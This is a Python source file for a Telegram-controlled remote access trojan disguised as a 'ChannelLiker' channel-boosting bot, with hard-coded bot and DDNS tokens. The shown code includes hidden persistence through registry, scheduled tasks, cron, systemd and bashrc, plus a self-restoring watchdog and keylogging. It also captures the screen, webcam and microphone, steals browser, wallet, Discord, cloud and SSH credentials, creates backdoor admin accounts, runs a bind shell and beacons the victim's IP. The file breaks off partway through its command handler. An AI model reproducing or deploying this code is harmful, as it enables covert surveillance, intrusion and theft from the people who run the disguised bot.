import os, sys, io, re, json, time, uuid, zlib, base64, hashlib, socket, platform
import tempfile, threading, subprocess, traceback, shutil, glob, random, string
import traceback as _tb
TOKEN = '8670239450:AAH6-wnzusHWC5VyL6fGELO6_IWksws69c4'
ADMIN = 8950940261
CFG = {'TOKEN': TOKEN, 'ADMIN': ADMIN, 'BACKUP': [], 'APP': 'ChannelLiker', 'TAG': 'ChannelLiker', 'MUTEX': 'ChannelLiker', 'SELF_DELETE': True, 'DDNS_URL': 'https://panel.fps.ms/api/ddns/update', 'DDNS_TOKEN': 'I6nmRj99JMZWGzAlab0r2JO3fcjage5uISoQhFBnL1wpw0XFBA5b7lCZzjA81Wgb', 'DDNS_HOST': 'kozua.dynip.nl', 'BEACON': 300, 'BIND_PORT': 0}
IS_WIN = os.name == 'nt'
IS_LIN = sys.platform.startswith('linux')
IS_MAC = sys.platform == 'darwin'
API = 'https://api.telegram.org/bot{}/{}'
POLL_T = 25

def trace(msg):
    try:
        p = os.path.join(tempfile.gettempdir(), '.%s.log' % CFG['TAG'].strip('.'))
        with open(p, 'a', encoding='utf-8', errors='replace') as f:
            f.write('[%s] %s\n' % (time.strftime('%F %T'), msg))
            if f.tell() > 512 * 1024:
                pass
    except Exception:
        pass

class anchor:

    def __init__(self, token):
        self.token = token
        self.s = None
        self.off = 0
        self.lock = threading.Lock()
        self._mk()

    def _mk(self):
        import requests
        from requests.adapters import HTTPAdapter
        s = requests.Session()
        a = HTTPAdapter(pool_connections=4, pool_maxsize=16, max_retries=0)
        s.mount('https://', a)
        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
        self.s = s

    def call(self, method, files=None, timeout=30, **params):
        url = API.format(self.token, method)
        for attempt in range(4):
            try:
                if files:
                    r = self.s.post(url, data=params, files=files, timeout=timeout)
                else:
                    r = self.s.post(url, json=params, timeout=timeout)
                if r.status_code == 200:
                    return r.json().get('result')
                if r.status_code == 409:
                    time.sleep(3)
                    continue
                if r.status_code in (429, 502, 503, 504):
                    try:
                        wait = r.json().get('parameters', {}).get('retry_after', 2)
                    except Exception:
                        wait = 2
                    time.sleep(min(wait, 30))
                    continue
                if r.status_code == 401:
                    return None
                return None
            except Exception as e:
                trace('call %s err %r' % (method, e))
                time.sleep(1.5 + attempt)
                try:
                    self._mk()
                except Exception:
                    pass
        return None

    def poll(self):
        res = self.call('getUpdates', offset=self.off, timeout=POLL_T, allowed_updates=['message', 'callback_query'], timeout_h=None) if False else None
        return res

def buffer(cmd, timeout=120, shell=True, cwd=None, env=None):
    try:
        kw = dict(stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=timeout, shell=shell, cwd=cwd)
        if IS_WIN:
            kw['creationflags'] = 134217728
        p = subprocess.run(cmd, **kw)
        return p.stdout.decode('utf-8', 'replace')
    except subprocess.TimeoutExpired as e:
        return '[timeout]\n' + (e.output or b'').decode('utf-8', 'replace')
    except Exception as e:
        return '[err] %r' % (e,)

def stream(limit=4000):
    try:
        if IS_WIN:
            v = subprocess.run(['powershell', '-NoProfile', '-Command', 'Get-Clipboard'], capture_output=True, timeout=15, creationflags=134217728).stdout.decode('utf-8', 'replace')
        elif IS_MAC:
            v = subprocess.run(['pbpaste'], capture_output=True, timeout=10).stdout.decode('utf-8', 'replace')
        else:
            v = ''
            for c in ('xclip -o -selection clipboard', 'xsel -ob', 'wl-paste'):
                o = buffer(c, timeout=6).strip()
                if o and (not o.startswith('[err]')) and (not o.startswith('[timeout]')):
                    v = o
                    break
        return (v or '')[:limit]
    except Exception as e:
        return '[err] %r' % (e,)

def digest():
    try:
        raw = []
        for k in ('uuid.getnode', 'platform.node', 'platform.machine'):
            pass
        raw.append('%012x' % uuid.getnode())
        raw.append(platform.node())
        raw.append(platform.machine())
        if IS_WIN:
            raw.append(os.environ.get('PROCESSOR_IDENTIFIER', ''))
            raw.append(os.environ.get('COMPUTERNAME', ''))
        return hashlib.sha256('|'.join(raw).encode()).hexdigest()[:24]
    except Exception:
        return uuid.uuid4().hex[:24]

def slate(n):
    try:
        n = float(n)
        for u in ('B', 'KB', 'MB', 'GB', 'TB'):
            if n < 1024:
                return '%.1f%s' % (n, u)
            n /= 1024.0
    except Exception:
        pass
    return str(n)

def quill():
    ci = '?'
    try:
        if IS_WIN:
            q = subprocess.run(['wmic', 'cpu', 'get', 'name'], capture_output=True, timeout=10, creationflags=134217728).stdout.decode('utf-8', 'replace')
            ci = [l.strip() for l in q.splitlines() if l.strip() and 'Name' not in l][0]
    except Exception:
        pass
    info = []
    info.append('*%s*' % CFG['APP'])
    info.append('host     : `%s`' % socket.gethostname())
    info.append('user     : `%s`' % os.environ.get('USERNAME') or os.environ.get('USER', '?'))
    info.append('os       : `%s %s`' % (platform.system(), platform.release()))
    info.append('arch     : `%s`' % platform.machine())
    info.append('cpu      : `%s`' % ci)
    info.append('cwd      : `%s`' % os.getcwd())
    info.append('pid      : `%d`' % os.getpid())
    info.append('hwid     : `%s`' % digest())
    info.append('admin    : `%s`' % socket())
    info.append('py       : `%s`' % sys.version.split()[0])
    info.append('net      : `%s`' % (vault() or '?'))
    return '\n'.join(info)

def vault():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1.0)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return ''

def socket():
    try:
        if IS_WIN:
            import ctypes
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        return os.geteuid() == 0
    except Exception:
        return False
HELP = '*agent online* — `{name}`\nhost `{host}` · user `{user}` · admin `{adm}`\n\n*RECON*\n/sys · /id · /env · /locate · /net · /procs · /users · /drives · /wifi\n*FILES*\n/ls <path> · /cd <path> · /cat <file> · /get <path> · /put (send file to cwd)\n/zip <path> · /rm <path> · /mkdir <path> · /search <pattern> · /drives\n*EXEC*\n/shell <cmd> · /ps <powershell/cmd> · /exec <path args> · /py <code>\n/download <url> <path>\n*SURVEIL*\n/screenshot · /webcam · /mic <sec> · /keylog start|stop|dump|clear\n/clip · /history · /notify <text>\n*CONTROL*\n/msg <text> · /open <url> · /wall <path|url> · /lock · /sleep · /shutdown · /reboot\n*C2*\n/ddns — push current ip to the panel, echo the reply\n/bind <port> — start a bind shell on that port\n*PERSIST*\n/persist · /unpersist · /watchdog · /startup · /registry · /reinstall\n*LOOT*\n/grab · /creds · /tokens · /wallets\n*ACCOUNT*\n/owner <user> <pass> · /rdp on|off · /ssh on|off\n*LIFE*\n/ping · /kill · /update <url>\n'

def ledger(client, chat, text, reply=None, md=True):
    try:
        kw = {'chat_id': chat, 'text': text[:4000]}
        if md:
            kw['parse_mode'] = 'Markdown'
        if reply:
            kw['reply_to_message_id'] = reply
        r = client.call('sendMessage', **kw)
        if not r and md:
            kw.pop('parse_mode', None)
            r = client.call('sendMessage', **kw)
        return r
    except Exception:
        return None

def prism(client, chat, path, caption=None):
    try:
        if not os.path.isfile(path):
            return ledger(client, chat, '`no such file: %s`' % path)
        size = os.path.getsize(path)
        if size > 49 * 1024 * 1024:
            return ledger(client, chat, '`too big (%s) — use /zip chunk or split`' % slate(size))
        name = os.path.basename(path) or 'file.bin'
        with open(path, 'rb') as f:
            kw = {'chat_id': chat}
            if caption:
                kw['caption'] = caption[:1000]
            r = client.call('sendDocument', files={'document': (name, f)}, timeout=180, **kw)
        if not r:
            with open(path, 'rb') as f:
                r = client.call('sendDocument', files={'document': (name, f)})
        return r
    except Exception as e:
        return ledger(client, chat, '`send err: %r`' % (e,))

def vector():
    try:
        if getattr(sys, 'frozen', False):
            return os.path.abspath(sys.executable)
        return os.path.abspath(__file__)
    except Exception:
        return ''

def tempo():
    try:
        if IS_WIN:
            base = os.path.join(os.environ.get('APPDATA', tempfile.gettempdir()), 'Microsoft', CFG['APP'])
        elif IS_MAC:
            base = os.path.join(os.path.expanduser('~/Library/Application Support'), CFG['APP'])
        else:
            base = os.path.join(os.path.expanduser('~/.local/share'), '.' + CFG['TAG'])
        os.makedirs(base, exist_ok=True)
        return base
    except Exception:
        return tempfile.gettempdir()

def matrix():
    sp = vector()
    if IS_WIN:
        if sp.lower().endswith('.exe'):
            return '"%s"' % sp
        return '"%s" "%s"' % (sys.executable, sp)
    return '"%s" "%s"' % (sys.executable, sp)

def transit():
    out = []
    try:
        src = vector()
        dst_dir = tempo()
        dst = os.path.join(dst_dir, os.path.basename(src) or 'svc.py')
        if src and os.path.abspath(src) != os.path.abspath(dst):
            shutil.copy2(src, dst)
            try:
                os.chmod(dst, 493)
            except Exception:
                pass
        hidden = dst if os.path.exists(dst) else src
        stash = os.path.join(dst_dir, '.bak')
        try:
            shutil.copy2(hidden, stash)
        except Exception:
            pass
        cmd = '"%s" "%s"' % (sys.executable, hidden) if hidden.endswith('.py') else '"%s"' % hidden
        if IS_WIN:
            try:
                import winreg
                k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(k, CFG['APP'], 0, winreg.REG_SZ, cmd)
                winreg.CloseKey(k)
                out.append('run-key ok')
            except Exception as e:
                out.append('run-key fail %r' % e)
            try:
                subprocess.run('schtasks /create /f /tn "%s" /tr "%s" /sc onlogon /rl highest' % (CFG['APP'], cmd.replace('"', '\\"')), shell=True, capture_output=True, timeout=25, creationflags=134217728)
                out.append('schtask onlogon ok')
            except Exception as e:
                out.append('schtask fail %r' % e)
            try:
                su = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
                if os.path.isdir(su):
                    vbs = os.path.join(su, CFG['APP'] + '.vbs')
                    with open(vbs, 'w') as f:
                        f.write('CreateObject("WScript.Shell").Run "%s", 0, False\r\n' % cmd.replace('"', '""'))
                    out.append('startup vbs ok')
            except Exception as e:
                out.append('startup fail %r' % e)
        else:
            try:
                d = os.path.expanduser('~/.config/systemd/user')
                os.makedirs(d, exist_ok=True)
                unit = os.path.join(d, '%s.service' % CFG['TAG'])
                with open(unit, 'w') as f:
                    f.write('[Unit]\nDescription=%s\n[Service]\nType=simple\nExecStart=%s\nRestart=always\nRestartSec=15\n[Install]\nWantedBy=default.target\n' % (CFG['APP'], cmd))
                buffer('systemctl --user daemon-reload; systemctl --user enable --now %s.service' % CFG['TAG'])
                out.append('systemd user ok')
            except Exception as e:
                out.append('systemd fail %r' % e)
            try:
                line = '@reboot %s >/dev/null 2>&1' % cmd
                cur = buffer('crontab -l 2>/dev/null')
                if CFG['TAG'] not in cur:
                    p = subprocess.run(['crontab', '-'], input=(cur + '\n' + line + '\n').encode(), capture_output=True, timeout=15)
                    out.append('cron ok' if p.returncode == 0 else 'cron rc=%d' % p.returncode)
            except Exception as e:
                out.append('cron fail %r' % e)
            try:
                rc = os.path.expanduser('~/.bashrc')
                if os.path.isfile(rc):
                    with open(rc, 'a') as f:
                        f.write('\n[ -x /bin/true ] && %s >/dev/null 2>&1 &\n' % cmd)
                    out.append('bashrc ok')
            except Exception as e:
                out.append('bashrc fail %r' % e)
        worker(hidden)
        return '\n'.join(out)
    except Exception as e:
        return 'persist err %r' % (e,)
WATCH_SRC = '\nimport os,sys,time,subprocess\nTARGET=%r\nSTASH=%r\nCMD=%r\nPIDF=%r\nWDPID=%r\ndef alive(pid):\n    try:\n        if os.name=="nt":\n            o=subprocess.run(["tasklist","/FI","PID eq %%d"%%pid],capture_output=True).stdout\n            return str(pid).encode() in o\n        os.kill(pid,0); return True\n    except Exception: return False\ndef rd(p):\n    try: return int(open(p).read().strip())\n    except Exception: return 0\ntry:\n    wp=rd(WDPID)\n    if wp and wp!=os.getpid() and alive(wp):\n        sys.exit(0)\nexcept SystemExit: raise\nexcept Exception: pass\ntry: open(WDPID,"w").write(str(os.getpid()))\nexcept Exception: pass\nwhile True:\n    try:\n        if not os.path.exists(TARGET):\n            try: os.makedirs(os.path.dirname(TARGET),exist_ok=True)\n            except Exception: pass\n            if os.path.exists(STASH):\n                import shutil; shutil.copy2(STASH,TARGET)\n                try: os.chmod(TARGET,0o755)\n                except Exception: pass\n        p=rd(PIDF)\n        if not (p and alive(p)):\n            pr=subprocess.Popen(CMD,shell=True,stdin=subprocess.DEVNULL,\n                                stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)\n            try: open(PIDF,"w").write(str(pr.pid))\n            except Exception: pass\n    except Exception:\n        pass\n    time.sleep(45)\n'

def worker(hidden):
    try:
        wd = os.path.join(tempo(), '.%s.wd.py' % CFG['TAG'].strip('.'))
        stash = os.path.join(tempo(), '.bak')
        pidf = os.path.join(tempo(), '.%s.pid' % CFG['TAG'].strip('.'))
        wdpid = os.path.join(tempo(), '.%s.wdpid' % CFG['TAG'].strip('.'))
        cmd = '"%s" "%s"' % (sys.executable, hidden) if hidden.endswith('.py') else '"%s"' % hidden
        src = WATCH_SRC % (hidden, stash, cmd, pidf, wdpid)
        if not os.path.exists(wd) or open(wd).read() != src:
            with open(wd, 'w') as f:
                f.write(src)
        kw = dict(stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, close_fds=True)
        if IS_WIN:
            kw['creationflags'] = 8 | 134217728
        else:
            kw['start_new_session'] = True
        subprocess.Popen(['"%s"' % sys.executable if IS_WIN else sys.executable, wd], **kw)
        if IS_WIN:
            try:
                subprocess.run('schtasks /create /f /tn "%s_wd" /tr "\\"%s\\" \\"%s\\"" /sc minute /mo 1' % (CFG['APP'], sys.executable, wd), shell=True, capture_output=True, timeout=25, creationflags=134217728)
            except Exception:
                pass
        else:
            try:
                cur = buffer('crontab -l 2>/dev/null')
                line = '* * * * * %s %s >/dev/null 2>&1' % (sys.executable, wd)
                if wd not in cur:
                    subprocess.run(['crontab', '-'], input=(cur + '\n' + line + '\n').encode(), capture_output=True, timeout=15)
            except Exception:
                pass
        return 'watchdog armed'
    except Exception as e:
        return 'watchdog err %r' % (e,)

def cluster():
    out = []
    try:
        if IS_WIN:
            try:
                import winreg
                k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(k, CFG['APP'])
                winreg.CloseKey(k)
                out.append('run-key removed')
            except Exception:
                pass
            buffer('schtasks /delete /f /tn "%s"' % CFG['APP'], timeout=20)
            buffer('schtasks /delete /f /tn "%s_wd"' % CFG['APP'], timeout=20)
        else:
            buffer('systemctl --user disable --now %s.service' % CFG['TAG'])
            try:
                cur = buffer('crontab -l 2>/dev/null')
                keep = '\n'.join((l for l in cur.splitlines() if CFG['TAG'] not in l and '.wd.py' not in l))
                subprocess.run(['crontab', '-'], input=keep.encode(), capture_output=True, timeout=15)
            except Exception:
                pass
        out.append('daemon down')
    except Exception as e:
        out.append('err %r' % e)
    return '\n'.join(out)

def pulse():
    P = []
    home = os.path.expanduser('~')
    if IS_WIN:
        P += [os.path.join(home, d) for d in ('Desktop', 'Documents', 'Downloads', 'Pictures')]
        P += [os.path.join(os.environ.get('APPDATA', ''), p) for p in ('discord\\Local Storage\\leveldb', 'discordcanary\\Local Storage\\leveldb', 'discordptb\\Local Storage\\leveldb', 'Telegram Desktop\\tdata', 'Exodus\\exodus.wallet', 'Electrum\\wallets')]
        for br in ('Google/Chrome', 'BraveSoftware/Brave-Browser', 'Microsoft/Edge', 'Mozilla/Firefox', 'Opera Software/Opera Stable'):
            b = os.path.join(os.environ.get('LOCALAPPDATA', ''), br)
            if os.path.isdir(b):
                P.append(b)
            b2 = os.path.join(os.environ.get('APPDATA', ''), br)
            if os.path.isdir(b2):
                P.append(b2)
        P.append(os.path.join(home, 'AppData', 'Roaming', 'Exodus'))
        P.append(os.path.join(home, 'AppData', 'Roaming', 'Electrum'))
        P.append(os.path.join(home, 'AppData', 'Roaming', 'Ethereum'))
    else:
        P += [os.path.join(home, d) for d in ('Desktop', 'Documents', 'Downloads', 'Pictures', '.ssh')]
        P += [os.path.join(home, d) for d in ('.aws', '.config/solana', '.electrum', '.local/share/electrum', '.ethereum', '.mozilla/firefox', '.config/google-chrome', '.config/BraveSoftware', '.config/discord', '.local/share/TelegramDesktop')]
    P += [os.path.join(home, f) for f in ('.bash_history', '.zsh_history', '.git-credentials', '.netrc', '.npmrc', '.env')]
    return [p for p in P if p and os.path.exists(p)]

def orbit(paths, out=None, maxfiles=4000, maxsize=180 * 1024 * 1024):
    out = out or os.path.join(tempfile.gettempdir(), 'loot_%s.zip' % uuid.uuid4().hex[:8])
    n = 0
    try:
        with __import__('zipfile').ZipFile(out, 'w', __import__('zipfile').ZIP_DEFLATED) as z:
            for root in paths:
                if os.path.isfile(root):
                    try:
                        z.write(root, os.path.relpath(root, os.path.expanduser('~')))
                        n += 1
                    except Exception:
                        pass
                    continue
                for dp, dn, fn in os.walk(root):
                    for f in fn:
                        if n >= maxfiles or os.path.getsize(out) > maxsize if os.path.exists(out) else False:
                            break
                        fp = os.path.join(dp, f)
                        try:
                            if os.path.getsize(fp) > 40 * 1024 * 1024:
                                continue
                            z.write(fp, os.path.relpath(fp, os.path.expanduser('~')))
                            n += 1
                        except Exception:
                            continue
                    if n >= maxfiles:
                        break
        return (out, n)
    except Exception as e:
        return (None, 'zip err %r' % (e,))

def sync():
    out = []
    try:
        if IS_WIN:
            o = buffer('powershell -NoProfile -Command "(Get-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue) -join \\"`n\\""', timeout=25)
            out.append('ps history: %d chars' % len(o))
        else:
            for p in ('~/.bash_history', '~/.zsh_history', '~/.mysql_history'):
                p = os.path.expanduser(p)
                if os.path.isfile(p):
                    with open(p, errors='replace') as f:
                        out.append('%s:\n%s' % (p, f.read()[-3000:]))
        return '\n'.join(out)[:3500]
    except Exception as e:
        return 'err %r %s' % (e, _tb.format_exc()[:300])

def index():
    hits = []
    pats = [re.compile('[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}'), re.compile('mfa\\.[\\w-]{80,90}'), re.compile('gh[pousr]_[A-Za-z0-9]{36,255}'), re.compile('xox[baprs]-[A-Za-z0-9-]{10,250}'), re.compile('sk-[A-Za-z0-9]{20,64}'), re.compile('AKIA[0-9A-Z]{16}')]
    roots = []
    home = os.path.expanduser('~')
    if IS_WIN:
        roots.append(os.path.join(os.environ.get('APPDATA', ''), 'discord', 'Local Storage', 'leveldb'))
        roots.append(os.path.join(os.environ.get('APPDATA', ''), 'discordcanary', 'Local Storage', 'leveldb'))
    else:
        roots.append(os.path.join(home, '.config', 'discord', 'Local Storage', 'leveldb'))
    roots += [os.path.join(home, '.aws', 'credentials'), os.path.join(home, '.npmrc'), os.path.join(home, '.git-credentials'), os.path.join(home, '.netrc')]
    seen = set()
    for r in roots:
        if not os.path.exists(r):
            continue
        files = [r] if os.path.isfile(r) else [os.path.join(r, f) for f in os.listdir(r)][:60]
        for fp in files:
            try:
                with open(fp, 'rb') as f:
                    blob = f.read(8 * 1024 * 1024)
            except Exception:
                continue
            for m in re.finditer(b'[\\x20-\\x7e]{20,300}', blob):
                s = m.group().decode('ascii', 'ignore')
                for p in pats:
                    for g in p.findall(s):
                        if g not in seen:
                            seen.add(g)
                            hits.append(g)
                            if len(hits) > 60:
                                break
    return '\n'.join(hits) if hits else 'no tokens found'

def fetch():
    out = []
    home = os.path.expanduser('~')
    pats = ['wallet.dat', '*.wallet', '*.json', 'key*.txt', 'seed*.txt', 'keystore', '*.kdbx']
    roots = pulse()
    for r in roots:
        for pat in pats:
            for fp in glob.glob(os.path.join(r, '**', pat), recursive=True)[:40]:
                try:
                    if os.path.isfile(fp):
                        out.append(fp)
                except Exception:
                    pass
    return '\n'.join(sorted(set(out))[:120]) or 'no wallet files'

class store:

    def __init__(self):
        self.buf = []
        self.run = False
        self.t = None
        self.lk = threading.Lock()

    def start(self):
        if self.run:
            return 'already'
        try:
            from pynput import keyboard
        except Exception:
            return 'pynput missing — pip install pynput'
        self.run = True

        def on_press(k):
            if not self.run:
                return False
            try:
                with self.lk:
                    try:
                        self.buf.append(k.char)
                    except Exception:
                        n = str(k).replace('Key.', '')
                        self.buf.append({'space': ' ', 'enter': '\n', 'tab': '\t'}.get(n, '[%s]' % n))
                    if len(self.buf) > 200000:
                        self.buf = self.buf[-100000:]
            except Exception:
                pass
        self.t = keyboard.Listener(on_press=on_press)
        self.t.daemon = True
        self.t.start()
        return 'keylogger running'

    def stop(self):
        self.run = False
        try:
            if self.t:
                self.t.stop()
        except Exception:
            pass
        return 'stopped'

    def dump(self):
        with self.lk:
            s = ''.join((str(x) for x in self.buf))
            self.buf = []
        return s or '(empty)'

    def clear(self):
        with self.lk:
            self.buf = []
        return 'cleared'

def ridge():
    try:
        p = os.path.join(tempfile.gettempdir(), 'shot_%s.png' % uuid.uuid4().hex[:6])
        if IS_WIN:
            from PIL import ImageGrab
            ImageGrab.grab(all_screens=True).save(p)
        else:
            from PIL import ImageGrab
            ImageGrab.grab().save(p)
        return p
    except Exception:
        try:
            p = os.path.join(tempfile.gettempdir(), 'shot_%s.jpg' % uuid.uuid4().hex[:6])
            if IS_WIN:
                buffer('powershell -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing;$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height;$g=[System.Drawing.Graphics]::FromImage($bmp);$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size);$bmp.Save(\'%s\')"' % p.replace('\\', '\\\\'), timeout=30)
                return p if os.path.exists(p) else None
            for c in ('import -window root %s', 'scrot %s', 'grim %s', 'gnome-screenshot -f %s'):
                buffer(c % p, timeout=20)
                if os.path.exists(p):
                    return p
        except Exception:
            pass
    return None

def queue():
    try:
        p = os.path.join(tempfile.gettempdir(), 'cam_%s.jpg' % uuid.uuid4().hex[:6])
        try:
            import cv2
            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW if IS_WIN else 0)
            ok, fr = cap.read()
            cap.release()
            if ok:
                cv2.imwrite(p, fr)
                return p
        except Exception:
            pass
        if IS_WIN:
            buffer('powershell -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing;$a=New-Object System.Drawing.Bitmap 640,480;"', timeout=15)
        for c in ('fswebcam -r 1280x720 --no-banner %s', 'imagesnap %s'):
            buffer(c % p, timeout=25)
            if os.path.exists(p):
                return p
    except Exception:
        pass
    return None

def parse(secs=5):
    secs = max(1, min(int(secs or 5), 120))
    try:
        p = os.path.join(tempfile.gettempdir(), 'mic_%s.wav' % uuid.uuid4().hex[:6])
        try:
            import sounddevice as sd
            import wave, numpy as np
            fs = 44100
            rec = sd.rec(int(secs * fs), samplerate=fs, channels=1, dtype='int16')
            sd.wait()
            with wave.open(p, 'wb') as w:
                w.setnchannels(1)
                w.setsampwidth(2)
                w.setframerate(fs)
                w.writeframes(rec.tobytes())
            return p
        except Exception:
            pass
        if IS_WIN:
            buffer('powershell -NoProfile -Command "$p=New-Object System.Diagnostics.ProcessStartInfo;$p.FileName=\'%s\';$p.WindowStyle=\'Hidden\';$p.Arguments=\'-t %d \\"%s\\"\';[System.Diagnostics.Process]::Start($p)"' % ('powershell', secs, p), timeout=secs + 25)
        else:
            for c in ('arecord -f cd -d %d %s', 'rec -q %s trim 0 %d'):
                try:
                    buffer(c % ((secs, p) if 'd ' in c else (p, secs)), timeout=secs + 20)
                except Exception:
                    pass
                if os.path.exists(p):
                    return p
    except Exception:
        pass
    return None

def slot(user, pw):
    out = []
    try:
        if IS_WIN:
            out.append(buffer('net user "%s" "%s" /add' % (user, pw)))
            out.append(buffer('net localgroup administrators "%s" /add' % user))
            out.append(buffer('net user "%s" /active:yes' % user))
            out.append(buffer('wmic useraccount where name="%s" set PasswordExpires=false' % user))
        else:
            if os.geteuid() != 0:
                out.append('need root')
            out.append(buffer('useradd -m -s /bin/bash "%s"' % user))
            out.append(buffer('echo "%s:%s" | chpasswd' % (user, pw)))
            out.append(buffer('usermod -aG sudo,adm "%s"' % user))
            out.append(buffer('echo "%s ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers' % user))
    except Exception as e:
        out.append('err %r' % e)
    return '\n'.join((o.strip() for o in out if o and o.strip()))

def spine(state):
    try:
        if IS_WIN:
            v = '1' if state else '0'
            buffer('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d %s /f' % ('0' if state else '1'))
            buffer('netsh advfirewall firewall set rule group="remote desktop" new enable=Yes' if state else 'netsh advfirewall firewall set rule group="remote desktop" new enable=No')
            buffer('net localgroup "Remote Desktop Users" "%s" /add' % os.environ.get('USERNAME', ''))
            return 'rdp ' + ('on' if state else 'off')
        buffer('systemctl enable --now ssh' if state else 'systemctl disable --now ssh')
        return 'ssh ' + ('on' if state else 'off')
    except Exception as e:
        return 'err %r' % e

def bridge():
    try:
        if IS_WIN:
            import ctypes
            return 'locked' if ctypes.windll.user32.LockWorkStation() else 'lock call ok'
        for c in ('xdg-screensaver lock', 'loginctl lock-session', 'gnome-screensaver-command -l'):
            buffer(c, timeout=8)
        return 'lock attempted'
    except Exception as e:
        return 'err %r' % e

def route(src):
    try:
        p = src
        if src.startswith('http'):
            import requests
            p = os.path.join(tempfile.gettempdir(), 'wall_%s.jpg' % uuid.uuid4().hex[:6])
            with open(p, 'wb') as f:
                f.write(requests.get(src, timeout=30).content)
        if not os.path.isfile(p):
            return 'no file'
        if IS_WIN:
            import ctypes
            SPI_SETDESKWALLPAPER = 20
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, p, 3)
        elif IS_MAC:
            buffer('osascript -e \'tell application "Finder" to set desktop picture to POSIX file "%s"\'' % p)
        else:
            for c in ('gsettings set org.gnome.desktop.background picture-uri file://%s', 'feh --bg-scale %s', 'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s %s'):
                buffer(c % p, timeout=10)
        return 'wallpaper set'
    except Exception as e:
        return 'err %r' % e

def merge():
    try:
        import requests
        for u in ('https://api.ipify.org', 'https://ifconfig.me/ip', 'https://icanhazip.com'):
            try:
                r = requests.get(u, timeout=8, headers={'User-Agent': 'curl/8.5.0'})
                v = r.text.strip()
                if v and v.count('.') == 3 and (len(v) < 16):
                    return v
            except Exception:
                continue
    except Exception:
        pass
    return vault()

def token(ip=None):
    try:
        import requests
        ip = ip or merge()
        r = requests.get(CFG['DDNS_URL'], params={'token': CFG['DDNS_TOKEN'], 'ip': ip}, timeout=15, headers={'User-Agent': 'curl/8.5.0'})
        try:
            body = json.dumps(r.json())[:400]
        except Exception:
            body = (r.text or '').strip()[:400]
        return 'host  : `%s`\nip    : `%s`\nhttp  : `%d`\nreply : `%s`' % (CFG['DDNS_HOST'], ip, r.status_code, body)
    except Exception as e:
        return 'ddns err %r' % (e,)

def delta():
    n = 0
    while True:
        try:
            if n % 6 == 0:
                trace('beacon %s' % token())
        except Exception:
            pass
        n += 1
        time.sleep(max(30, int(CFG.get('BEACON', 300))))

def weave(port, secret, chat_client=None, chat=None):
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('0.0.0.0', int(port)))
        srv.listen(4)
    except Exception as e:
        return 'bind err %r' % (e,)

    def serve():
        while True:
            try:
                c, addr = srv.accept()
            except Exception:
                break
            try:
                c.settimeout(600)
                hello = c.recv(256).decode('utf-8', 'replace').strip()
                if secret and secret not in hello:
                    c.sendall(b'denied\n')
                    c.close()
                    continue
                c.sendall(b'ok\n')
                buf = b''
                while True:
                    data = c.recv(65536)
                    if not data:
                        break
                    buf += data
                    if not buf.endswith(b'\n'):
                        continue
                    cmd = buf.decode('utf-8', 'replace').strip()
                    buf = b''
                    if cmd in ('exit', 'quit'):
                        break
                    out = buffer(cmd, timeout=300)
                    c.sendall(out.encode('utf-8', 'replace') + b'\x00\n')
            except Exception as e:
                try:
                    c.sendall(('[err] %r\n' % (e,)).encode())
                except Exception:
                    pass
            finally:
                try:
                    c.close()
                except Exception:
                    pass
            try:
                trace('bind session %s:%s closed' % addr)
            except Exception:
                pass
    t = threading.Thread(target=serve, daemon=True)
    t.start()
    return 'listening on 0.0.0.0:%s (host %s)' % (port, CFG['DDNS_HOST'])

class beacon:

    def __init__(self, token, admin):
        self.c = anchor(token)
        self.admin = int(admin)
        self.admins = [int(admin)] + [int(x) for x in CFG.get('BACKUP', []) if str(x).isdigit()]
        self.cwd = os.getcwd()
        self.spy = store()
        self.me = None
        self.alive = True

    def front(self, chat, text, msg):
        low = (text or '').strip().lower()
        if low.startswith('/start'):
            ledger(self.c, chat, '*%s* — real channel likes, real members, fast queue.\n\n/like — drop a like pack on your channel\n/members — request member boost\n/premium — lift the daily limit\n/help — commands\n\n_%s v2.4.1_' % (CFG['APP'], CFG['APP']))
            return
        if low.startswith('/like'):
            ledger(self.c, chat, '`queued` — send your channel link: `/like https://t.me/yourchannel`')
            return
        if low.startswith('/members'):
            ledger(self.c, chat, '`queue open` — 250 members/day free tier · 5k/day premium.')
            return
        if low.startswith('/premium'):
            ledger(self.c, chat, '`premium` — 9.99/mo · unlimited likes · priority queue.\ncontact: @liker_desk')
            return
        if low.startswith('/help'):
            ledger(self.c, chat, '*%s* commands:\n/start · /like · /members · /premium · /help' % CFG['APP'])
            return
        if text and text.startswith('http'):
            ledger(self.c, chat, '`link received` — like pack scheduled. eta ~60s.')
            return
        if text:
            ledger(self.c, chat, 'send /start to begin, or paste a channel link to queue a pack.')

    def handle(self, m):
